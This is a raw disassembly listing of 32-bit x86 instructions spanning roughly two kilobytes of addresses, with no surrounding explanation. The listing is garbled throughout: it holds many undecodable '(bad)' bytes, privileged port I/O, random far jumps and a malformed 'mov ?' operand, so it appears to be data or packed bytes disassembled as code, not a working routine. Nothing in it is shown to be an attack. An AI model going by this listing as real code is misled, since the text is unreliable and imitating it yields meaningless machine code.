  4155e7:	sub    DWORD PTR [edi],eax
  4155e9:	out    0xf6,eax
  4155eb:	adc    eax,0xb9718bbb
  4155f0:	loope  0x4155f5
  4155f2:	pop    edi
  4155f3:	sbb    eax,0xc20d019b
  4155f8:	cdq    
  4155f9:	stos   BYTE PTR es:[edi],al
  4155fa:	retf   
  4155fb:	or     DWORD PTR ds:0x43fbaf90,0x48
  415602:	imul   eax,DWORD PTR [edx],0x3da66436
  415608:	sub    ebx,esp
  41560a:	sub    bl,dl
  41560c:	adc    edx,DWORD PTR [edx-0x6f]
  41560f:	jecxz  0x415680
  415611:	inc    esi
  415612:	mov    bh,0xd9
  415614:	pop    ss
  415615:	clc    
  415616:	inc    eax
  415617:	jge    0x4155a8
  415619:	sahf   
  41561a:	push   eax
  41561b:	inc    ebx
  41561c:	sahf   
  41561d:	mov    eax,ds:0x3b2a4c92
  415622:	dec    esp
  415623:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415624:	daa    
  415625:	sub    DWORD PTR [edi-0x62],esp
  415628:	(bad)  
  415629:	std    
  41562a:	jae    0x415606
  41562c:	es loop 0x415635
  41562f:	xchg   edx,eax
  415630:	ins    BYTE PTR es:[edi],dx
  415631:	retf   
  415632:	dec    edi
  415633:	cld    
  415634:	jns    0x415695
  415636:	cs xchg ebp,eax
  415638:	shl    al,cl
  41563a:	mov    bh,0x83
  41563c:	shr    DWORD PTR [esi+0x3f326ab1],0x35
  415643:	js     0x4156a0
  415645:	stc    
  415646:	jno    0x41560a
  415648:	dec    ebx
  415649:	cdq    
  41564a:	dec    eax
  41564b:	mov    cs:0xed12a262,eax
  415651:	jbe    0x415625
  415653:	add    edi,DWORD PTR [esp+eax*4-0x69]
  415657:	pushf  
  415658:	mov    ah,0xb2
  41565a:	add    al,0x26
  41565c:	mov    DWORD PTR [esi+0x16],ecx
  41565f:	inc    ebp
  415660:	push   esi
  415661:	(bad)  
  415662:	sbb    DWORD PTR [eax+0x25],esp
  415665:	ds imul edx,esp,0xffffffa6
  415669:	addr16 push eax
  41566b:	mov    eax,ds:0xc5da5789
  415670:	dec    DWORD PTR [edi+ebp*2+0x4ae65fd7]
  415677:	and    esi,DWORD PTR [ebx-0x37]
  41567a:	xchg   ecx,eax
  41567b:	out    0x3c,al
  41567d:	and    BYTE PTR [ecx+0x3e],0x27
  415681:	je     0x415627
  415683:	ficom  WORD PTR [esi]
  415685:	mov    esp,0xfec5cb4d
  41568a:	clc    
  41568b:	dec    esp
  41568c:	(bad)  
  41568d:	pushf  
  41568e:	cdq    
  41568f:	aad    0xf5
  415691:	dec    ebx
  415692:	adc    cl,BYTE PTR [edi+0x44]
  415695:	xor    DWORD PTR [ecx+0x2dbab475],esp
  41569b:	ret    0xd87f
  41569e:	imul   ecx,DWORD PTR [edi],0xb84f0080
  4156a4:	daa    
  4156a5:	pop    es
  4156a6:	fs push 0x34
  4156a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4156aa:	sti    
  4156ab:	jnp    0x41569c
  4156ad:	js     0x415684
  4156af:	pop    eax
  4156b0:	jns    0x4156ba
  4156b2:	stos   BYTE PTR es:[edi],al
  4156b3:	xchg   esp,eax
  4156b4:	rcl    DWORD PTR [edi],cl
  4156b6:	mov    esp,0x3703d389
  4156bb:	fmul   st,st(3)
  4156bd:	push   ebp
  4156be:	mov    esp,edi
  4156c0:	mov    ebp,0x92d2e4fc
  4156c5:	mov    cl,0x69
  4156c7:	inc    esi
  4156c8:	outs   dx,BYTE PTR ds:[esi]
  4156c9:	cmp    eax,0xfc6e2d25
  4156ce:	push   ebx
  4156cf:	dec    esi
  4156d0:	pop    eax
  4156d1:	push   0xffffff90
  4156d3:	shl    ebp,cl
  4156d5:	sbb    BYTE PTR ds:0xa6fe464,dl
  4156db:	and    BYTE PTR [edx],ch
  4156dd:	cdq    
  4156de:	push   ebp
  4156df:	mov    ecx,0x3cb19fd4
  4156e4:	inc    ebp
  4156e5:	ror    BYTE PTR [eax],cl
  4156e7:	adc    al,0x3a
  4156ea:	jmp    0x4156a2
  4156ec:	push   es
  4156ed:	push   ecx
  4156ef:	fbld   TBYTE PTR [edx]
  4156f1:	scas   al,BYTE PTR es:[edi]
  4156f2:	leave  
  4156f3:	fwait
  4156f4:	or     DWORD PTR [eax-0x259903f6],0xfcb77ba6
  4156fe:	cld    
  4156ff:	jno    0x4156cf
  415701:	pop    ds
  415702:	aaa    
  415703:	jno    0x41569b
  415705:	pop    ss
  415706:	inc    esp
  415707:	sub    esp,DWORD PTR [ebx]
  415709:	mov    dl,0x7a
  41570b:	in     eax,dx
  41570c:	cmp    al,0x51
  41570f:	xor    eax,0x43a76150
  415714:	xor    edx,esi
  415716:	add    esp,DWORD PTR [edi-0x3770f37c]
  41571c:	inc    edi
  41571d:	pop    ecx
  41571e:	out    dx,al
  41571f:	je     0x4156dd
  415721:	xor    esp,esp
  415723:	add    ebx,ebx
  415725:	sub    bl,BYTE PTR [edx]
  415727:	enter  0x142c,0x69
  41572b:	call   0xab22:0xcf113a87
  415732:	jge    0x4157b0
  415734:	mov    edi,0xea290cd4
  415739:	adc    eax,0x4ad6e268
  41573e:	push   edi
  41573f:	add    bh,BYTE PTR cs:[ebx+eiz*4]
  415743:	fcom   QWORD PTR ds:0x9a925ad6
  41574a:	sbb    edx,DWORD PTR [ebp+0x4385f8dc]
  415750:	ret    
  415751:	jp     0x415728
  415753:	in     eax,0x5
  415755:	or     al,0x2c
  415757:	cld    
  415758:	xor    ebp,esp
  41575a:	(bad)  
  41575b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41575c:	das    
  41575d:	or     al,0xff
  41575f:	ins    BYTE PTR es:[edi],dx
  415760:	mov    ds:0xec2833f6,eax
  415765:	leave  
  415766:	pop    ss
  415767:	xor    esi,DWORD PTR [ebx]
  415769:	idiv   DWORD PTR [ebp+0x1fd9a465]
  41576f:	add    BYTE PTR [ecx-0x29],0x23
  415773:	mov    eax,0x136b8eda
  415778:	cmp    eax,DWORD PTR [edi]
  41577a:	ins    DWORD PTR es:[edi],dx
  41577b:	les    ecx,FWORD PTR [esp+eax*2-0x3fb56833]
  415782:	jo     0x41577b
  415784:	adc    DWORD PTR [edi+ebp*8],eax
  415787:	mov    esp,0x3c467c3a
  41578c:	jno    0x415727
  41578e:	mov    ecx,0xa6a436ea
  415793:	dec    esp
  415794:	inc    ebp
  415795:	shl    BYTE PTR [ecx+0xc2ae5a],1
  41579b:	js     0x415811
  41579d:	lahf   
  41579e:	add    DWORD PTR [edx+0x74],edi
  4157a1:	xor    BYTE PTR [eax],bh
  4157a3:	aas    
  4157a4:	cmp    al,0xb6
  4157a6:	pusha  
  4157a7:	adc    al,0x62
  4157a9:	enter  0xf497,0x52
  4157ad:	test   BYTE PTR [ebp-0x20],0xf0
  4157b1:	adc    eax,0x808ab290
  4157b6:	push   eax
  4157b7:	into   
  4157b8:	and    al,0x35
  4157ba:	adc    eax,0xfb2ae9ef
  4157bf:	nop
  4157c0:	ret    0x7510
  4157c3:	sbb    BYTE PTR [edx-0x79],al
  4157c6:	jo     0x415845
  4157c8:	sbb    BYTE PTR [ebp-0x24],0xb6
  4157cc:	or     DWORD PTR [edx],edx
  4157ce:	in     eax,0xfa
  4157d0:	call   0x53a07bea
  4157d5:	leave  
  4157d6:	sub    al,BYTE PTR [edi+0x65ae2ae6]
  4157dc:	cmp    DWORD PTR [edi+0x1],ebx
  4157df:	rol    BYTE PTR [edx+0x54],0x74
  4157e3:	jp     0x41582d
  4157e5:	and    dx,WORD PTR [edx+ecx*4+0x7f]
  4157ea:	cmp    DWORD PTR [ecx-0x3eec11e8],ebp
  4157f0:	in     al,dx
  4157f1:	push   edi
  4157f2:	(bad)  
  4157f3:	int    0x67
  4157f5:	fist   DWORD PTR [esi+0x4]
  4157f8:	push   ds
  4157f9:	inc    ecx
  4157fa:	test   eax,0x83a8d46d
  4157ff:	and    DWORD PTR [esi-0x6b],0x4fb6cbd6
  415806:	mov    edi,edi
  415808:	rcr    cl,0x5b
  41580b:	pop    ecx
  41580c:	fldcw  WORD PTR [esi+ebx*1]
  41580f:	shl    BYTE PTR [eax+0x59f2f342],cl
  415815:	mul    BYTE PTR [ecx]
  415817:	imul   eax,DWORD PTR [ebx+0x4d],0x4b
  41581b:	cli    
  41581c:	test   eax,0xc9ce3d6
  415821:	mov    ds:0x1db55a9f,eax
  415826:	ins    DWORD PTR es:[edi],dx
  415827:	(bad)  
  415828:	dec    esp
  415829:	and    DWORD PTR [eax],ecx
  41582b:	(bad)  
  41582c:	and    eax,0x6de2f138
  415831:	fst    DWORD PTR [edi]
  415833:	cmc    
  415834:	mov    al,ds:0xf4db9770
  415839:	xchg   edx,eax
  41583a:	gs mov ebx,0x54ec57ab
  415840:	lods   al,BYTE PTR ds:[esi]
  415841:	and    ch,ah
  415843:	sub    DWORD PTR [eax],esi
  415845:	dec    edi
  415846:	pop    esi
  415847:	lods   al,BYTE PTR ds:[esi]
  415848:	int3   
  415849:	mov    ?,ebp
  41584b:	dec    edi
  41584c:	jecxz  0x4157ef
  41584e:	xor    al,bl
  415850:	pop    ecx
  415851:	cmp    dh,BYTE PTR [ecx+0x7c]
  415854:	call   0xcb86:0x2d098226
  41585b:	clc    
  41585c:	push   ecx
  41585d:	inc    edx
  41585e:	clc    
  41585f:	inc    esi
  415860:	outs   dx,DWORD PTR ds:[esi]
  415861:	lahf   
  415862:	aas    
  415863:	and    eax,0x81c6c886
  415868:	mov    dl,0xa4
  41586a:	push   ds
  41586b:	popa   
  41586c:	add    al,0x92
  41586e:	sub    ebp,edx
  415870:	(bad)  
  415871:	cli    
  415872:	pop    esp
  415873:	ret    0x58fe
  415876:	sub    ah,BYTE PTR [esi]
  415878:	jl     0x415806
  41587a:	mov    cl,BYTE PTR [edi+0x7405fc34]
  415880:	fstp   QWORD PTR [ebp+0xcb828b9]
  415886:	ds sbb dl,al
  415889:	sbb    DWORD PTR [edi-0x773bb364],esi
  41588f:	test   al,0x6f
  415891:	rol    DWORD PTR [edi-0x12],0x9c
  415895:	inc    ecx
  415896:	or     al,cl
  415898:	inc    ebx
  415899:	pop    esp
  41589a:	mov    al,ds:0x84d1b7e2
  41589f:	popf   
  4158a0:	sub    ah,BYTE PTR [ebp+0x41]
  4158a3:	adc    al,0x6d
  4158a5:	add    edi,DWORD PTR [edx+ebp*4-0x1]
  4158a9:	clc    
  4158aa:	in     al,dx
  4158ab:	scas   eax,DWORD PTR es:[edi]
  4158ac:	repz xor DWORD PTR [edi-0x497473e1],esp
  4158b3:	jmp    0x2f71:0xb3ae8259
  4158ba:	xor    DWORD PTR [ebx-0x78],eax
  4158bd:	inc    ebp
  4158be:	jge    0x4158e6
  4158c0:	inc    ebx
  4158c1:	add    eax,0x5958b09a
  4158c6:	pmulhw mm2,QWORD PTR [ebx-0x7e5091e3]
  4158cd:	inc    edx
  4158ce:	pop    ss
  4158cf:	test   bl,dh
  4158d1:	push   esp
  4158d2:	push   esi
  4158d3:	fadd   DWORD PTR [eax]
  4158d5:	stc    
  4158d6:	test   DWORD PTR [edx],0x8305f162
  4158dc:	xor    al,0x28
  4158de:	push   eax
  4158df:	xchg   ecx,eax
  4158e0:	pushf  
  4158e1:	in     eax,dx
  4158e2:	push   eax
  4158e3:	cli    
  4158e4:	pop    ecx
  4158e5:	and    eax,0xd74588b0
  4158ea:	cmc    
  4158eb:	mov    dh,0xf4
  4158ed:	scas   al,BYTE PTR es:[edi]
  4158ee:	stos   DWORD PTR es:[edi],eax
  4158ef:	pushf  
  4158f0:	cmp    DWORD PTR [ebx+ebx*2],ebp
  4158f3:	xchg   esi,eax
  4158f4:	cmp    cl,BYTE PTR [ecx]
  4158f6:	sub    bh,BYTE PTR [edi+0x5b3c1cd7]
  4158fc:	jge    0x415965
  4158fe:	ins    DWORD PTR es:[edi],dx
  4158ff:	fadd   QWORD PTR [ebp+0x51]
  415902:	arpl   WORD PTR [edi-0x7ff09115],bp
  415908:	add    al,0x92
  41590a:	sahf   
  41590b:	gs in  eax,0xd0
  41590e:	cmp    dh,BYTE PTR [ebx+0xb3ace84]
  415914:	push   0x57fc3d9f
  415919:	adc    eax,DWORD PTR [edi-0x68e345b9]
  41591f:	jle    0x41593b
  415921:	in     eax,dx
  415922:	aas    
  415923:	and    BYTE PTR [ecx-0x41],ah
  415926:	cmp    DWORD PTR [edi-0x75030ff],eax
  41592c:	and    eax,0x92811dca
  415931:	outs   dx,DWORD PTR ds:[esi]
  415932:	loop   0x4158be
  415934:	call   0x2bebfd23
  415939:	neg    bh
  41593b:	mov    esi,0xf43965b8
  415940:	and    al,0x83
  415942:	outs   dx,BYTE PTR ds:[esi]
  415943:	xchg   BYTE PTR [eax+0x6e],cl
  415946:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  415948:	pop    esi
  415949:	cld    
  41594a:	mov    ebp,0x55cc5685
  41594f:	neg    BYTE PTR [esi]
  415951:	and    cl,dh
  415953:	jb     0x4159cc
  415955:	test   BYTE PTR [ebx],0xf3
  415958:	add    esp,DWORD PTR [eax]
  41595a:	sbb    al,0x47
  41595c:	jmp    0x42a4:0x70a8fa6e
  415963:	dec    edi
  415964:	popa   
  415965:	aam    0x17
  415967:	nop
  415968:	sub    ch,dl
  41596a:	rol    DWORD PTR [ebx],0x25
  41596d:	stos   DWORD PTR es:[edi],eax
  41596e:	jmp    0x8804:0x2b5145b0
  415975:	lods   eax,DWORD PTR ds:[esi]
  415976:	int    0x5a
  415978:	sub    bl,BYTE PTR [eax-0x49]
  41597b:	das    
  41597c:	mov    ds:0x46acffa,eax
  415981:	jle    0x415942
  415983:	gs pop eax
  415985:	and    esp,DWORD PTR [eax+0x385b6463]
  41598b:	in     eax,dx
  41598c:	adc    BYTE PTR ds:0xc9f5f429,al
  415992:	sbb    dl,BYTE PTR [edx-0x55a97157]
  415998:	jp     0x415921
  41599a:	xor    eax,0xa6222d26
  41599f:	xchg   esi,eax
  4159a0:	test   eax,0xbc77a222
  4159a5:	data16 je 0x415972
  4159a8:	add    BYTE PTR [edx+0x2c7f769d],0xd1
  4159af:	retf   
  4159b0:	mov    edx,DWORD PTR ds:0x89cbb795
  4159b6:	cmc    
  4159b7:	add    bh,BYTE PTR cs:[ecx]
  4159ba:	mov    edx,0x25483ec
  4159bf:	loop   0x415986
  4159c1:	enter  0xf2e3,0xa6
  4159c5:	adc    dl,BYTE PTR [ecx]
  4159c7:	or     eax,0x2d1255fe
  4159cc:	ror    DWORD PTR [eax+0x22],0x74
  4159d0:	xchg   ecx,eax
  4159d1:	aas    
  4159d2:	pop    eax
  4159d3:	repnz not BYTE PTR [eax]
  4159d6:	jl     0x415a3a
  4159d8:	mov    eax,ds:0x3f6a66
  4159dd:	mov    dl,ah
  4159df:	outs   dx,BYTE PTR ds:[esi]
  4159e0:	cmp    BYTE PTR [ebx],dl
  4159e2:	lahf   
  4159e3:	jbe    0x415a4f
  4159e5:	cdq    
  4159e6:	ss cld 
  4159e8:	iret   
  4159e9:	push   cs
  4159ea:	fbld   TBYTE PTR [edx]
  4159ec:	out    0x91,eax
  4159ee:	or     DWORD PTR [ebx+0x31],eax
  4159f1:	or     esp,ebp
  4159f3:	int3   
  4159f4:	sbb    ch,BYTE PTR [esi+0x19]
  4159f7:	push   edi
  4159f8:	call   0x803a:0x533181ba
  4159ff:	add    cl,BYTE PTR [ebx]
  415a01:	fcom   st(3)
  415a03:	push   edx
  415a04:	or     edi,ecx
  415a06:	dec    eax
  415a07:	sub    al,0x73
  415a09:	icebp  
  415a0a:	mov    eax,ds:0xf8fa91e2
  415a0f:	push   ds
  415a10:	fmul   DWORD PTR [edx+0x7c85082b]
  415a16:	add    BYTE PTR [edx-0x78ad1032],dh
  415a1c:	or     al,0x3d
  415a1e:	add    ebp,DWORD PTR [edx]
  415a20:	mov    cl,0x9e
  415a22:	stos   DWORD PTR es:[edi],eax
  415a23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a24:	fisttp QWORD PTR gs:[ebx-0x6ce5fb83]
  415a2b:	mov    edx,0x626e86c2
  415a30:	inc    edi
  415a31:	mov    ebx,0x56ae6d88
  415a36:	push   ecx
  415a37:	push   ds
  415a38:	in     al,0x80
  415a3a:	or     al,0xac
  415a3c:	push   0xf3a0273e
  415a41:	cmp    BYTE PTR [ecx],0x55
  415a44:	shl    BYTE PTR ds:0x632afb74,0x1b
  415a4b:	or     BYTE PTR [edi+0x43c7cb62],bh
  415a51:	xchg   edx,eax
  415a52:	(bad)  
  415a53:	or     eax,DWORD PTR ds:0x97a31ff2
  415a59:	icebp  
  415a5a:	icebp  
  415a5b:	fdivr  DWORD PTR ds:0x2fd9d2c9
  415a61:	das    
  415a62:	sub    eax,0xbc631c7
  415a67:	inc    edi
  415a68:	and    al,0xc8
  415a6a:	xor    ebp,edi
  415a6c:	(bad)  
  415a6d:	gs and dh,bh
  415a70:	fs pop ds
  415a72:	lea    eax,[esi+0x2d]
  415a75:	sub    BYTE PTR [ebx-0x78],bh
  415a78:	and    eax,0x12164c8f
  415a7d:	and    BYTE PTR [eax-0x65],0x98
  415a81:	pop    edi
  415a82:	sub    edi,DWORD PTR [ebx+0x20ed51e7]
  415a88:	aaa    
  415a89:	sub    BYTE PTR [esi-0x6c3fbc4d],0x88
  415a90:	call   0x39f4:0xf07577db
  415a97:	pop    ss
  415a98:	add    dh,cl
  415a9a:	fdiv   DWORD PTR [edx-0x27]
  415a9d:	push   eax
  415a9e:	add    dh,bl
  415aa0:	pop    ebp
  415aa1:	pop    esi
  415aa2:	cmp    cl,BYTE PTR [edi]
  415aa4:	cmp    DWORD PTR [eax-0x59e23b81],edx
  415aaa:	mov    edi,0x763ffa56
  415aaf:	bound  ecx,QWORD PTR ds:0xc1668bba
  415ab5:	ret    
  415ab6:	in     al,dx
  415ab7:	and    eax,0xe162e20c
  415abc:	pop    ecx
  415abd:	sti    
  415abe:	add    al,0x24
  415ac0:	fild   WORD PTR [ecx+0x4193d837]
  415ac6:	mov    eax,ds:0xff035645
  415acb:	xchg   esi,eax
  415acc:	jmp    0x415b0a
  415ace:	ja     0x415ad6
  415ad0:	mov    ecx,0x357b5339
  415ad5:	jle    0x415a6f
  415ad7:	retf   
  415ad8:	adc    BYTE PTR [ecx+edi*1-0x3],0x7
  415add:	mov    edi,0x5c703cbb
  415ae2:	mov    ds:0xd9b1ceeb,al
  415ae7:	scas   eax,DWORD PTR es:[edi]
  415ae8:	cmovbe ebp,edi
  415aeb:	jns    0x415b3a
  415aed:	(bad)  
  415aee:	mov    dh,0xb7
  415af0:	mov    eax,ds:0x7c9b7c0c
  415af5:	mov    ds:0x99cfdd3d,al
  415afa:	push   eax
  415afb:	dec    DWORD PTR [ecx-0x45]
  415afe:	daa    
  415aff:	leave  
  415b00:	or     eax,0x85cf823a
  415b05:	sbb    al,0x6b
  415b07:	and    esp,DWORD PTR [ecx]
  415b09:	mov    WORD PTR [edi-0x7e837e82],?
  415b0f:	dec    ebx
  415b10:	rcr    ecx,0xa1
  415b13:	ja     0x415af0
  415b15:	shl    BYTE PTR [esi],cl
  415b17:	pop    esi
  415b18:	add    ebp,DWORD PTR [esi+0x6863080e]
  415b1e:	in     al,dx
  415b1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b20:	sub    al,0xc7
  415b22:	jp     0x415b2a
  415b24:	in     al,dx
  415b25:	mov    ebp,0x8393df3f
  415b2a:	int3   
  415b2b:	adc    edi,esp
  415b2d:	or     ch,al
  415b2f:	clc    
  415b30:	aad    0xb
  415b32:	push   ecx
  415b33:	add    ah,BYTE PTR ds:0x697ccfe8
  415b39:	shl    BYTE PTR [ebp+0x489efa14],0x9a
  415b40:	sbb    al,0xb0
  415b42:	fimul  WORD PTR [esp+ebx*1+0x3793b777]
  415b49:	xor    ebx,DWORD PTR [bx+0x7670]
  415b4e:	push   es
  415b4f:	jmp    0xa89937a6
  415b54:	mov    esp,0x43a0c193
  415b59:	out    0xa7,eax
  415b5b:	das    
  415b5c:	das    
  415b5d:	addr16 shl ecx,0x10
  415b61:	mov    dl,0x49
  415b63:	int3   
  415b64:	mov    eax,0x251bc7c6
  415b69:	dec    ebp
  415b6a:	stc    
  415b6b:	adc    dl,cl
  415b6d:	xchg   edi,eax
  415b6e:	mov    ch,0xe2
  415b70:	jns    0x415af6
  415b72:	xor    al,0x88
  415b74:	test   DWORD PTR [eax-0x27],esp
  415b77:	ins    BYTE PTR es:[edi],dx
  415b78:	mov    ecx,0x982592cb
  415b7d:	and    BYTE PTR [edi],ch
  415b7f:	sub    dh,BYTE PTR [ecx-0x7b]
  415b82:	pusha  
  415b83:	push   esp
  415b84:	in     al,0xa5
  415b86:	mov    edx,ss
  415b88:	call   FWORD PTR [esi+0x6c]
  415b8b:	aaa    
  415b8c:	iret   
  415b8d:	(bad)  
  415b8e:	in     eax,0xc1
  415b90:	out    dx,eax
  415b91:	in     al,dx
  415b92:	dec    ebp
  415b93:	fs mov dl,0x3
  415b96:	mov    edi,ss
  415b98:	das    
  415b99:	mov    BYTE PTR [ebp+0x6ef1071f],0x93
  415ba0:	xchg   esp,eax
  415ba1:	adc    al,0x4c
  415ba3:	into   
  415ba4:	jne    0x415bfe
  415ba6:	lds    esi,FWORD PTR [esi-0x1a]
  415ba9:	loopne 0x415b4b
  415bab:	xor    eax,0xa55e1284
  415bb0:	jmp    0xeaa3:0xb354b68e
  415bb7:	push   esi
  415bb8:	dec    DWORD PTR ss:[ebx+0x1f039927]
  415bbf:	xchg   esp,eax
  415bc0:	loope  0x415be6
  415bc2:	xchg   edi,eax
  415bc3:	push   0xffffff9b
  415bc5:	(bad)  
  415bc6:	jmp    0xd24522c0
  415bcb:	xchg   edi,eax
  415bcc:	dec    esp
  415bcd:	das    
  415bce:	push   ss
  415bcf:	pop    esi
  415bd0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415bd1:	cmp    BYTE PTR [esi-0x7ac225c1],bl
  415bd7:	push   ecx
  415bd8:	dec    eax
  415bd9:	in     al,dx
  415bda:	and    esi,edx
  415bdc:	xor    BYTE PTR [esp+edx*4],ch
  415bdf:	fisttp QWORD PTR [edx-0x1]
  415be2:	jg     0x415c0c
  415be4:	xor    al,BYTE PTR [edi+ebx*1-0x35]
  415be8:	shl    DWORD PTR [ebx+0x45d30fb6],cl
  415bee:	jmp    0xcf631812
  415bf3:	aad    0x1a
  415bf5:	push   ecx
  415bf6:	loope  0x415bc0
  415bf8:	mov    ch,0x43
  415bfa:	(bad)  
  415bfb:	mov    eax,0x4e357e02
  415c00:	add    ecx,DWORD PTR [edx]
  415c02:	sbb    bl,dl
  415c04:	scas   al,BYTE PTR es:[edi]
  415c05:	mov    edx,0x2a360242
  415c0a:	cwde   
  415c0b:	cdq    
  415c0c:	stos   BYTE PTR es:[edi],al
  415c0d:	cmp    al,BYTE PTR [ebx-0x21f08680]
  415c13:	cmp    al,ch
  415c15:	icebp  
  415c16:	xor    esi,DWORD PTR [esi+ecx*8+0x60]
  415c1a:	mov    BYTE PTR [edx+0x3a],dl
  415c1d:	fdivr  QWORD PTR [ecx]
  415c1f:	loopne 0x415bf8
  415c21:	xor    DWORD PTR [ebx-0x6cee3587],ecx
  415c27:	sbb    bl,cl
  415c29:	ret    0x8065
  415c2c:	mov    esp,ebp
  415c2e:	sbb    DWORD PTR [ebx+0x54a5a701],ecx
  415c34:	or     al,0xc1
  415c36:	mov    WORD PTR [ebx+0x26],fs
  415c39:	rcl    DWORD PTR [ecx+0x78],0x9b
  415c3d:	imul   ebp,DWORD PTR [esi+0x71],0xfffffffd
  415c41:	and    DWORD PTR [esi],eax
  415c43:	(bad)  
  415c44:	adc    eax,0xa4f20598
  415c49:	sub    eax,0x6c5a0ec4
  415c4e:	cdq    
  415c4f:	fadd   st,st(3)
  415c51:	retf   0x574c
  415c54:	inc    ebx
  415c55:	add    al,dh
  415c57:	push   ebp
  415c58:	daa    
  415c59:	aaa    
  415c5a:	adc    BYTE PTR [edx-0x3a],dh
  415c5d:	sahf   
  415c5e:	xchg   ebp,eax
  415c5f:	aas    
  415c60:	sbb    BYTE PTR [ecx],0xcd
  415c63:	fidiv  DWORD PTR [ecx]
  415c65:	mov    ds,WORD PTR [edx]
  415c67:	cld    
  415c68:	stos   DWORD PTR es:[edi],eax
  415c69:	xchg   esp,eax
  415c6a:	jmp    0x3e00:0x69bfff83
  415c71:	aaa    
  415c72:	and    BYTE PTR [esi],0xef
  415c75:	mov    BYTE PTR [edi+0x13],dh
  415c78:	add    bh,BYTE PTR [esi]
  415c7a:	shr    BYTE PTR [edx+0x11],1
  415c7d:	mov    edi,0xecdc06bf
  415c82:	aam    0xa7
  415c84:	scas   eax,DWORD PTR es:[edi]
  415c85:	das    
  415c86:	push   edx
  415c87:	aas    
  415c88:	imul   ecx,ebp,0x6013a587
  415c8e:	hlt    
  415c8f:	xchg   ecx,eax
  415c90:	inc    edx
  415c91:	(bad)  
  415c92:	in     eax,0x49
  415c94:	aas    
  415c95:	mov    esp,0xb94e5784
  415c9a:	lods   eax,DWORD PTR ds:[esi]
  415c9c:	dec    esp
  415c9d:	xor    edx,esp
  415c9f:	jb     0x415cca
  415ca1:	pop    ecx
  415ca2:	mov    ah,0x8
  415ca4:	fcomp  QWORD PTR ds:0xf28e347d
  415caa:	cmp    ecx,ebp
  415cac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415cad:	and    BYTE PTR [esi-0x3c],al
  415cb0:	ret    0x5034
  415cb3:	scas   eax,DWORD PTR es:[edi]
  415cb4:	jg     0x415c55
  415cb6:	mov    ds:0xd960013c,al
  415cbb:	(bad)  
  415cbc:	je     0x415c8d
  415cbe:	xor    al,0xca
  415cc0:	pop    eax
  415cc1:	lds    esi,FWORD PTR [edx]
  415cc3:	lahf   
  415cc4:	dec    edx
  415cc5:	pop    ss
  415cc6:	add    al,0x3f
  415cc8:	mov    eax,0xc82960cf
  415ccd:	sahf   
  415cce:	mov    eax,0x107ac406
  415cd4:	jecxz  0x415c62
  415cd6:	or     ebp,esi
  415cd8:	xchg   edx,eax
  415cd9:	sub    al,0x9
  415cdb:	(bad)  
  415cdc:	adc    BYTE PTR [edi-0x43],ah
  415cdf:	mov    cl,0x46
  415ce1:	jns    0x415d3f
  415ce3:	xchg   ebp,eax
  415ce4:	and    al,0x8b
  415ce6:	nop
  415ce7:	gs ret 0xd5ff
  415ceb:	ficomp WORD PTR ds:0x809b57b2
  415cf1:	aas    
  415cf2:	or     eax,0xcd5ae5dd
  415cf7:	icebp  
  415cf8:	jmp    0x11aa:0x248dc57
  415cff:	sub    bh,BYTE PTR [eax-0x6f]
  415d02:	into   
  415d03:	sub    bl,BYTE PTR [ebx+0x2a4986dc]
  415d09:	(bad)  
  415d0a:	retf   0x6023
  415d0d:	das    
  415d0e:	or     edx,DWORD PTR [eax+0x2e]
  415d11:	in     eax,dx
  415d12:	xchg   ch,bl
  415d14:	jne    0x415d0a
  415d16:	mov    dh,0xd0
  415d18:	cmp    eax,0xfed4cb1d
  415d1d:	(bad)  
  415d1e:	nop
  415d1f:	pusha  
  415d20:	xchg   edi,eax
  415d21:	shr    BYTE PTR [esi],0xfd
  415d24:	mov    ds:0x4fd4d979,eax
  415d29:	push   0x5
  415d2b:	sub    bh,ah
  415d2d:	push   ss
  415d2e:	jmp    0xae34:0x3919f160
  415d35:	push   ebx
  415d36:	js     0x415cd1
  415d38:	scas   al,BYTE PTR es:[edi]
  415d39:	add    eax,0x5d
  415d3c:	dec    edi
  415d3d:	mov    edi,0x2d9b580e
  415d42:	inc    eax
  415d43:	sbb    esi,ebx
  415d45:	arpl   WORD PTR [ebp-0x6d],bx
  415d48:	gs iret 
  415d4a:	stos   DWORD PTR es:[edi],eax
  415d4b:	stos   BYTE PTR es:[edi],al
  415d4c:	ss repnz fwait
  415d4f:	pop    ebp
  415d50:	lea    edx,[edi-0x55e4fcc7]
  415d56:	push   0x55
  415d58:	scas   eax,DWORD PTR es:[edi]
  415d59:	ins    BYTE PTR es:[edi],dx
  415d5a:	mov    ds:0x89627ee8,al
  415d5f:	dec    esi
  415d60:	mov    cl,0xd8
  415d62:	dec    eax
  415d63:	(bad)  
  415d64:	push   ebp
  415d65:	inc    ecx
  415d66:	and    DWORD PTR [ecx+0xe],ebx
  415d69:	aam    0xb2
  415d6b:	jge    0x415d6b
  415d6d:	das    
  415d6e:	out    dx,eax
  415d6f:	xchg   edi,eax
  415d70:	dec    ebx
  415d71:	mov    ds:0x590ba32f,al
  415d76:	scas   eax,DWORD PTR es:[edi]
  415d77:	sahf   
  415d78:	and    ch,dh
  415d7a:	retf   0xf6d3
  415d7d:	mov    dl,al
  415d7f:	shl    BYTE PTR [eax+0x43],0xc7
  415d83:	jle    0x415dc1
  415d85:	sbb    al,0xcd
  415d87:	xchg   ebp,eax
  415d88:	popf   
  415d89:	fbstp  TBYTE PTR [ebx+0x2f]
  415d8c:	mov    bl,0xee
  415d8e:	retf   0x15bd
  415d91:	or     BYTE PTR [edx],ch
  415d93:	pop    esp
  415d94:	jns    0x415d17
  415d96:	or     BYTE PTR [esi+eiz*1-0x4b],0xc7
  415d9b:	pop    esi
  415d9c:	ins    DWORD PTR es:[edi],dx
  415d9d:	imul   eax,esp,0xa0f994e0
  415da3:	bound  edi,QWORD PTR [ebx+0x361b5058]
  415da9:	fadd   DWORD PTR [ebx+0x34]
  415dac:	cwde   
  415dad:	and    DWORD PTR [ebp-0x1e],ebp
  415db0:	in     al,dx
  415db1:	in     eax,0x58
  415db3:	pop    esp
  415db4:	jnp    0x415ddc
  415db6:	xchg   esp,eax
  415db7:	jmp    0x6690:0x69b37332
  415dbe:	sahf   
